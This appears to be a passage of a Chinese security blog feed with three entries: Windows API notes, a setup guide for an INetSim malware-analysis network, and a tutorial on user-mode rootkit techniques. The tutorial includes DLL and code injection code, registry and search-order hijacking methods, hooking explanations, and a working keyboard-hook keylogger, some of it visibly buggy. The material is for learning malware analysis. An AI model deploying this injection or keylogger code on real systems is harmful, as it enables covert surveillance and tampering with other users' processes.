class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，则返回值为NO_ERROR。<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365943(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa365943(v=vs.85).aspx</a></p><h2 id="SHDeleteKey"><a href="#SHDeleteKey" class="headerlink" title="SHDeleteKey"></a>SHDeleteKey</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;删除子项及其所有子项。该函数从注册表中删除密钥和所有密钥的值。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LSTATUS SHDeleteKey（</div><div class="line">  <span class="variable">_In_</span> HKEY hkey，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR pszSubKey  <span class="comment">//以空字符结尾的字符串的地址，指定要删除的键的名称。</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果成功则返回ERROR_SUCCESS，<br><a href="https://msdn.microsoft.com/en-us/library/bb773486(VS.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/bb773486(VS.85).aspx</a></p><h2 id="RegisterServiceCtrlHandler"><a href="#RegisterServiceCtrlHandler" class="headerlink" title="RegisterServiceCtrlHandler"></a>RegisterServiceCtrlHandler</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注册一个函数来处理扩展的服务控制请求。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SERVICE_STATUS_HANDLE WINAPI RegisterServiceCtrlHandlerEx（</div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpServiceName，  由调用线程运行的服务的名称。</div><div class="line">  <span class="variable">_In_</span> LPHANDLER_FUNCTION_EX lpHandlerProc，  <span class="comment">//指向要注册的处理函数的指针。</span></div><div class="line">  <span class="variable">_In_opt_</span> LPVOID lpContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，则返回值是一个服务状态句柄。<br><a href="https://msdn.microsoft.com/en-us/library/ms685058.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms685058.aspx</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;Windows API 就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 8.1,Windows 8,Windows 7,Windows Vista、Windows XP、Windows Server 2012、Windows 2008 R2 、Windows Server 2003、Windows 2000、Windows 95、Windows 98、Windows Me(Millennium Editon)和Windows CE等几乎所有版本。&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建inetsim虚拟分析网络</title>
    <link href="http://yoursite.com/2018/02/10/%E6%90%AD%E5%BB%BAinetsim%E8%99%9A%E6%8B%9F%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C/"/>
    <id>http://yoursite.com/2018/02/10/搭建inetsim虚拟分析网络/</id>
    <published>2018-02-09T16:15:11.000Z</published>
    <updated>2018-02-09T16:47:54.526Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>马上要看恶意代码分析实战第十四讲了，想到之前留了一个坑—搭建inetsim虚拟分析网络，我们分析病毒的时候不能把我们的分析机暴露与正常的互联网中，这样很容易使我们沦落为黑客抓取的肉鸡，也有可能病毒透过虚拟机共享的网络，感染同一网络下的其他机器。但是，我们也不能不给虚拟机连上网络，因为许多病毒感染首先会检测openInternet，如果处于断网状态，病毒可能不会有感染行为。所以我们分析病毒的时候需要搭建一个虚拟网络平台，进行正常的病毒分析。</strong><a id="more"></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>参考文献：<a href="https://www.52pojie.cn/thread-330528-1-1.html" target="_blank" rel="external">https://www.52pojie.cn/thread-330528-1-1.html</a></strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们需要两台虚拟机，一台是配置我们的Inetsim的Kali，Inetsim是虚拟网络组件，用于在实验室环境下模拟各种网络环境。拥有各种网络协议。另外一台是我们的分析机。此外还需有ApateDNS,用于把某些软件（如恶意软件）的DNS响应欺骗到指定的主机上。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置虚拟机硬件网络。添加一个新的网络适配器VMnet3，类型设置为仅主机模式。子网ip和子网掩码随意。如图：<br>    <img src="https://i.imgur.com/upudLn6.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用ifconfig查看kali的ip，如图所示，安装inetsim(kali自带)，然后配置inetsim，修改<strong>#service_bind_address 10.10.10.1</strong>为<strong>service_bind_address xxx.xxx.xxx.xxx（kali本机ip）</strong><br>    <img src="https://i.imgur.com/sYrNcPE.png" alt=""><br>    <img src="https://i.imgur.com/fePW9xs.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改DNS，设置为手动获取，<strong>首选DNS地址设置为回环地址，备用地址设置为Kali本机ip。</strong><br>    <img src="https://i.imgur.com/Q18MkWS.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开ApateDns，利用ApateDns去欺骗DNS响应到我们的Kali服务器。<br>    <img src="https://i.imgur.com/Co3RpYs.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;马上要看恶意代码分析实战第十四讲了，想到之前留了一个坑—搭建inetsim虚拟分析网络，我们分析病毒的时候不能把我们的分析机暴露与正常的互联网中，这样很容易使我们沦落为黑客抓取的肉鸡，也有可能病毒透过虚拟机共享的网络，感染同一网络下的其他机器。但是，我们也不能不给虚拟机连上网络，因为许多病毒感染首先会检测openInternet，如果处于断网状态，病毒可能不会有感染行为。所以我们分析病毒的时候需要搭建一个虚拟网络平台，进行正常的病毒分析。&lt;/strong&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>用户态下的Rootkit进程隐藏技术</title>
    <link href="http://yoursite.com/2018/02/07/%E7%94%A8%E6%88%B7%E6%80%81%E4%B8%8B%E7%9A%84RootKit%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/07/用户态下的RootKit进程隐藏技术/</id>
    <published>2018-02-07T09:20:11.000Z</published>
    <updated>2018-03-10T14:27:09.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一部分：Rootkit技术"><a href="#第一部分：Rootkit技术" class="headerlink" title="第一部分：Rootkit技术"></a>第一部分：Rootkit技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这些技术都是把恶意代码注入到进程（线程）中，一般用procexp能看到。<br><a id="more"></a></p><h1 id="第二部分：DLL注入"><a href="#第二部分：DLL注入" class="headerlink" title="第二部分：DLL注入"></a>第二部分：DLL注入</h1><h2 id="DLL注入的第一种方法：CreateRemoteThread远程线程调用"><a href="#DLL注入的第一种方法：CreateRemoteThread远程线程调用" class="headerlink" title="DLL注入的第一种方法：CreateRemoteThread远程线程调用"></a>DLL注入的第一种方法：CreateRemoteThread远程线程调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL注入是指向某一个特定的进程空间强制插入一个特定的DLL文件映像，值得注意的是这种插入是强制性的插入，从技术层面来看，<strong>DLL注入是利用LoadLibrary（）加载特定的DLL文件到进程的内存空间。</strong>注入的对象是可以是自身，也可以是远程进程。DLL注入技术实现主要分为5个部分，</p><ul><li><strong>第一步打开进程，获取进程的句柄，</strong></li><li><strong>第二歩是在内存空间开辟一段内存空间</strong></li><li><strong>第三步是向刚刚开辟的内存中写入需要注入DLL的路径，</strong></li><li><strong>第四步是利用GetProcessAddree()获取LoadLibrary的地址。</strong></li><li><p><strong>第五步是调用远程线程，利用LoadLibrary（）去加载DLL。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDLLPath)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HANDLE hProcess = <span class="literal">NULL</span>,hThread=<span class="literal">NULL</span>;</div><div class="line">DWORD BufSize = (DWORD)(_tcslen(szDLLPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line"><span class="comment">/*-------------打开需要注入的进程-------------*/</span></div><div class="line"><span class="keyword">if</span> (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"OpenProcess(%d) Open Fail:[%d]"</span>, dwPID, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/*------------向目标进程开辟内存空间-----------*/</span></div><div class="line">LPVOID pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, BufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"><span class="comment">/*------------将目标路径写入进程---------------*/</span></div><div class="line">WriteProcessMenory(hProcess, pRemoteBuf, (LPVOID)szDLLPath, BufSize, <span class="literal">NULL</span>);</div><div class="line"><span class="comment">/*-----------获取LoadLibrary地址--------------*/</span></div><div class="line">HMODULE hMod = GetModuleHandle(<span class="string">L"kenerl32.dll"</span>);</div><div class="line">pThreadProc = GetAddress(hMod, <span class="string">"LoadLibrary"</span>);</div><div class="line"><span class="comment">/*------------调用远程线程加载DLL--------------*/</span></div><div class="line">hThread = CreateRemoteThread(hProcess,</div><div class="line"><span class="literal">NULL</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">pThreadProc,  <span class="comment">//远程线程LaodLibrary</span></div><div class="line">pRemoteBuf,   <span class="comment">//参数，DLL的路径</span></div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="literal">NULL</span>);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hThread);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>反编译如下：</p><ul><li>打开进程<br><img src="https://i.imgur.com/2A2LMkZ.png" alt=""></li><li>设置进程内存空间<br><img src="https://i.imgur.com/V80hqpw.png" alt=""></li><li>调用CreateRemoteThread实现注入<br><img src="https://i.imgur.com/dMceeeT.png" alt=""></li></ul></li></ul><h2 id="DLL注入的第二种方法：利用注册表注入"><a href="#DLL注入的第二种方法：利用注册表注入" class="headerlink" title="DLL注入的第二种方法：利用注册表注入"></a>DLL注入的第二种方法：利用注册表注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用APPiNIT_dll注册表来实现DLL注入。因为windows允许只要加载了USER32.dll的进程并且，某一个dll的绝对路径处于注册表<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Windows\AppInit_DLLs</strong>中，os就会自动去加载位于该注册表的有效的DLL。所以只需要在注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Windows\AppInit_DLLs中添加DLL的绝对路径，并把数值改为1，可以使得所有加载USER32.dll的进程全部加载目标路径的DLL。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用AppCertDlls注册表，将<strong>HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls</strong>下写入dll的路径，可以将此注册表项下的DLL加载到调用CreateProcess，CreateProcessAsUser，CreateProcessWithLogonW，CreateProcessWithTokenW和WinExec的每个进程中。<strong>值得注意的是win xp-win 10 默认不存在这个注册表项</strong></p><h2 id="DLL注入的第三种方法：SetWindowsHookEx-设置钩子"><a href="#DLL注入的第三种方法：SetWindowsHookEx-设置钩子" class="headerlink" title="DLL注入的第三种方法：SetWindowsHookEx()设置钩子"></a>DLL注入的第三种方法：SetWindowsHookEx()设置钩子</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用windows的消息机制，可以在事件发送到os之间设置一条钩链，来钩取不同的消息，如以下代码，利用SetwindowsHookEx可以钩取一个键盘消息。并且调用钩子处理函数来处理这个消息，所达到的效果和dll注入是一样的（执行dll内部的代码）<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, GetModuleHandle(TEXT(<span class="string">"消息钩取(DLL注入）实验.dll"</span>)), <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>)</div><div class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"安装钩子失败"</span>), TEXT(<span class="string">"提示"</span>), MB_OKCANCEL);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;钩子函数要使用回调函数，这样可以重复钩取消息<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK HookProc(int ncode, WPARAM wParam, LPARAM lParam)</div><div class="line">&#123;</div><div class="line">FILE *fp;   <span class="comment">//做文件的写入工作</span></div><div class="line">TCHAR <span class="type">key</span>[<span class="number">20</span>];</div><div class="line">const TCHAR *k = NULL;</div><div class="line">TCHAR *p = NULL;</div><div class="line">if (ncode &gt;= <span class="number">0</span>)  <span class="comment">//ncode 大于等于0，操作有效</span></div><div class="line">&#123;</div><div class="line">if (!(lParam &amp; <span class="number">0x80000000</span>))<span class="comment">//出现按键消息</span></div><div class="line">&#123;</div><div class="line">GetKeyNameText(lParam,<span class="type">key</span>,<span class="number">20</span>);<span class="comment">//检索键名的字符串</span></div><div class="line">int <span class="section">state</span> = GetKeyState(VK_CAPITAL);<span class="comment">//指定大小写的状态，返回值是1或者0</span></div><div class="line">int asyncState = GetAsyncKeyState(VK_SHIFT);<span class="comment">//指定函数调用时候</span></div><div class="line">if (lstrlen(<span class="type">key</span>) == <span class="number">1</span>)  <span class="comment">//只出现一个按键</span></div><div class="line">&#123;</div><div class="line">if (asyncState &lt; <span class="number">0</span>)  <span class="comment">//未上档</span></div><div class="line">&#123;</div><div class="line">for (int i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++)</div><div class="line">&#123;</div><div class="line">if (KeyUn[i] == <span class="type">key</span>[<span class="number">0</span>])</div><div class="line">&#123;</div><div class="line"><span class="type">key</span>[<span class="number">0</span>] = KeyUn[i];</div><div class="line">break;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">if (k == NULL&amp;&amp;<span class="section">state</span> &gt; <span class="number">0</span>)  <span class="comment">//小写状态</span></div><div class="line">&#123;</div><div class="line">if (wParam &gt;= <span class="number">65</span> &amp;&amp; wParam &lt;= <span class="number">90</span>)</div><div class="line"><span class="type">key</span>[<span class="number">0</span>] += <span class="number">32</span>;   <span class="comment">//转化为ASCII小写</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else  <span class="comment">//小写状态</span></div><div class="line">&#123;</div><div class="line">if (k == NULL&amp;&amp;<span class="section">state</span> == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">if (wParam &gt;= <span class="number">65</span> &amp;&amp; wParam &lt;= <span class="number">90</span>)</div><div class="line"><span class="type">key</span>[<span class="number">0</span>] += <span class="number">32</span>;   <span class="comment">//转化为小写</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">k = &amp;<span class="type">key</span>[<span class="number">0</span>];         <span class="comment">//k指向缓冲区的地址</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else if (lstrlen(<span class="type">key</span>) == <span class="number">5</span>)</div><div class="line">&#123;</div><div class="line">if (<span class="type">key</span>[<span class="number">0</span>] == TEXT('N') &amp;&amp; <span class="type">key</span>[<span class="number">1</span>] == TEXT('u') &amp;&amp; <span class="type">key</span>[<span class="number">2</span>] == TEXT('m') &amp;&amp; <span class="type">key</span>[<span class="number">3</span>] == TEXT(' '))</div><div class="line">k = &amp;<span class="type">key</span>[<span class="number">4</span>];</div><div class="line">&#125;</div><div class="line">if (k != NULL)</div><div class="line">&#123;</div><div class="line">lstrcat(str,k);</div><div class="line"><span class="comment">//FlushBuffer();</span></div><div class="line"><span class="comment">/*HANDLE hf = CreateFile(TEXT("C:/数据.txt"), GENERIC_READ | GENERIC_WRITE,</span></div><div class="line"><span class="comment">0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);    </span></div><div class="line"><span class="comment">if (!GetProcessId(NULL))</span></div><div class="line"><span class="comment">ErrorExit(TEXT("GetProcessId"));</span></div><div class="line"><span class="comment">DWORD written;</span></div><div class="line"><span class="comment">WriteFile(hf, str, sizeof(str), &amp;written, 0);</span></div><div class="line"><span class="comment">CloseHandle(hf);*/</span></div><div class="line">fp = fopen(<span class="string">"E:/学习/C语言/Viusal Studio/消息钩取（DLL注入）实验--注入工具（GUI）/消息钩取（DLL注入）实验--注入工具（GUI）/抓取的数据.txt"</span>, <span class="string">"wt"</span>);</div><div class="line"><span class="comment">//fprintf(fp, "%s", str);</span></div><div class="line"><span class="comment">//fwrite(str,sizeof(str),1,fp)</span></div><div class="line">if(fwrite(str, sizeof(str), <span class="number">1</span>, fp)!=<span class="number">1</span>)</div><div class="line">MessageBox(NULL, TEXT(<span class="string">"文件写入失败"</span>), TEXT(<span class="string">"提示"</span>), MB_OKCANCEL);</div><div class="line">fclose(fp);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//如果没有找到notepad的进程，将消息传递给下一个钩子</span></div><div class="line">return CallNextHookEx(g_hHook, ncode, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）-Dll-Search-Order-Hijacking"><a href="#Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）-Dll-Search-Order-Hijacking" class="headerlink" title="Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）[Dll Search Order Hijacking]"></a>Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）[Dll Search Order Hijacking]</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dll搜索劫持技术是一种简单的dll注入技术，他利用windows加载dll目录的优先级来加载dll。他不需要通过修改注册表或者修改二进制文件的前提下注入dll的。下面是windows加载dll的默认搜索顺序：</p><ul><li>1.加载应用程序的目录</li><li>2.当前目录【经常利用到】</li><li>3.系统目录（../windows/system32）</li><li>4.16位子系统目录（../windows/system）</li><li>5.windows目录（../windows）</li><li>6.PATH环境变量列举的目录</li><li>说明：为了安全和加载速度，windows会在HKML\System\CurrentSet\SessionManger\SafeDll\SafeDllSearchMode下创建键值，系统会优先加载这些已知的dll(第一位)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在通过两个方面来进行劫持：</li><li>1.通过在上述注册表中添加恶意dll路径的键值，这样使得恶意dll优先注入到进程空间（这个恶意dll需要和系统dll同名）</li><li>2.在加载系统dll之前加载，<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有权访问文件系统的攻击者可能会将恶意ntshrui.dll放在C：\ Windows目录中。该DLL通常驻留在System32文件夹中。进程explorer.exe也驻留在c:\Windows中，一旦尝试从System32文件夹中加载ntshrui.dll，实际上会由于优先搜索顺序而加载由攻击者提供的DLL。由于攻击者已将其恶意ntshrui.dll放入与加载explorer.exe进程相同的目录中，因此将首先找到攻击者提供的DLL，从而加载代替合法DLL。由于explorer.exe在引导周期内被加载，攻击者的恶意软件被保证执行。【不上书上说的../windows比系统目录优先搜索，而是当前目录比系统目录被优先搜索】<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果启用windows的Dll的安全检查，情况可能会大有改观。<br>启用”安全DLL查找模式”时，查找顺序如下：</li><li>1.应用程序所在目录；</li><li>2.系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；</li><li>3.16位系统目录</li><li>4.Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；</li><li>5.当前目录。GetCurrentDirectory返回的目录；</li><li>6.环境变量PATH中所有目录。</li></ul><h1 id="第三部分：代码注入"><a href="#第三部分：代码注入" class="headerlink" title="第三部分：代码注入"></a>第三部分：代码注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码注入是一种向进程中插入一段独立运行的代码并且不会影响进程的运行（如崩溃）的技术，从技术上讲他也是调用CreateRemoteThread（）来注入远程代码。分两次向进程中注入，第一次以远程线程的形式注入，第二次以线程参数的形式注入远程进程。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">DWORD WINAPI ThreadProc()</div><div class="line">&#123;</div><div class="line"><span class="comment">//需要注入的代码</span></div><div class="line">&#125;</div><div class="line">BOOL InjectCode(DWORD pId)</div><div class="line">&#123;</div><div class="line">PHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">FALSE</span>, dwPID));</div><div class="line">dwsize = sizeof(THREADPARAM);   <span class="comment">//插入代码所需要数据的大小</span></div><div class="line">pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx();   <span class="comment">//在进程空间开辟一个数据大小相同的空间</span></div><div class="line">WriteProcessMenory(hProcess, pRemoteBuf[<span class="number">0</span>], &amp;param, dwsize, NULL);<span class="comment">//将注入代码所需要的数据写入进程空间</span></div><div class="line">dwsize = (dword)InjectCode() - (dword)ThreadProc();<span class="comment">//插入代码需要的空间大小</span></div><div class="line">pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx();    <span class="comment">//在进程中开辟等大小的空间用于存储代码</span></div><div class="line">WriteProcessMenory(hProcess, pRemoteBuf[<span class="number">0</span>], (LPVOID)ThreadProc(), dwsize, NULL);</div><div class="line">hTread = CreateRemoteThread(hProcess, </div><div class="line">                        NULL,</div><div class="line">                        <span class="number">0</span>,</div><div class="line">                        pRemoteBuf[<span class="number">1</span>], <span class="comment">//注入的代码</span></div><div class="line">                        pRemoteBuf[<span class="number">0</span>], <span class="comment">//代码所需要的数据作为代码的参数传入</span></div><div class="line">                        <span class="number">0</span>, NULL);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hThread);</div><div class="line">&#125;</div></pre></td></tr></table></figure><ul><li>反编译如下：<ul><li>复制代码所需数据<br><img src="https://i.imgur.com/9Kf0jWt.png" alt=""></li><li>打开目标进程：<br><img src="https://i.imgur.com/7IDTGAu.png" alt=""></li><li>开辟内存空间，为了存储数据<br><img src="https://i.imgur.com/ZX9hrXY.png" alt=""></li><li>写入数据<br><img src="https://i.imgur.com/LRBY0f0.png" alt=""></li><li>开辟进程空间，为了存储代码<br><img src="https://i.imgur.com/1Seh6VN.png" alt=""></li><li>写入代码<br><img src="https://i.imgur.com/0AQ7mt3.png" alt=""></li><li>调用CreateRemoteThread()进行代码注入<br><img src="https://i.imgur.com/ee8mYv8.png" alt=""></li></ul></li></ul><h1 id="第四部分：HOOK技术"><a href="#第四部分：HOOK技术" class="headerlink" title="第四部分：HOOK技术"></a>第四部分：HOOK技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HOOK叫做钩取(钩子)，他的原理是：windows系统分为用户态和内核态，在用户态中需要访问一些敏感的数据（网络，文件资源等）就必须要调用windowsAPI函数，来与kernel沟通获得该资源的使用权。钩子便可以这是在调用API函数的时候，在调用之前（IAT_HOOK）或者之后发挥作用，这样恶意软件便不需要创建一个进程就可以实现某些恶意的功能。便达到了隐藏自身的作用。</p><h2 id="1-IAT-HOOK技术【复杂且不友好】"><a href="#1-IAT-HOOK技术【复杂且不友好】" class="headerlink" title="1.IAT_HOOK技术【复杂且不友好】"></a>1.IAT_HOOK技术【复杂且不友好】</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在一个windows应用程序中，人们所编写的代码所占的比例不到20%，其他都是导入的是库文件（windows下主要是dll文件），dll文件的存在大大简化了人们的工作，同样的也减少了程序所运行的成本，因为在一个dll文件中不是所有函数都会被使用。在.exe文件中存在一个叫做IAT（导入地址表）的表，这个表存在的原因就是便于程序去dll文件中寻找特定的函数。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个正常的exe使用IAT的过程如下：程序调用了某个dll中的函数，首先回去程序自带的IAT中寻找改函数在dll中所处的地址，然后调用一个jmp跳转到dll！FUN()所在的地址，继续执行。【windows加载器会在程序运行时把dll中函数的地址存储在IAT中，当然程序第一个调用的是IAT的地址】<br>    <img src="https://i.imgur.com/DKkEngR.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果程序被IAT_HOOK的话，过程是这样的。首先先使用DLL注入把含有恶意代码的DLL注入到进程内部，并修改IAT数据，程序和正常过程一样调用IAT的地址，但是此时IAT的函数地址并不是正常的函数地址，jmp到恶意的函数中执行，执行完恶意代码后call到正常的dll中。然后retn。<br>    <img src="https://i.imgur.com/fYLAiIV.png" alt=""></p><h2 id="2-InLine-HOOK技术"><a href="#2-InLine-HOOK技术" class="headerlink" title="2.InLine_HOOK技术"></a>2.InLine_HOOK技术</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InLine_HOOK技术和IAT_HOOK技术同样是钩取需要调用的API函数，区别在于InLine_HOOK并不是钩取IAT的数据，而是直接修改API函数内前5个字节，将其修改为<strong>JMP XXXXXXXX(恶意代码地址）</strong>。当然在修改后要恢复修改的内容以便原函数能够正确的执行。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基本过程如下：正常调用API，在钩取前要修改原函数前5个字节，（1）做一个JMP，跳转到恶意代码，利用寄存器存储恶意代码地址，（2）然后跳转到原函数，还原原函数开始的前五个字节，以便正常执行原函数，（3)利用之前存储的地址，我们call过去，这样就到达了恶意代码处，(4)恶意代码执行完毕，返回正常执行原API函数，(5)最后返回用户领空.<br>    <img src="https://i.imgur.com/r4Disvj.png" 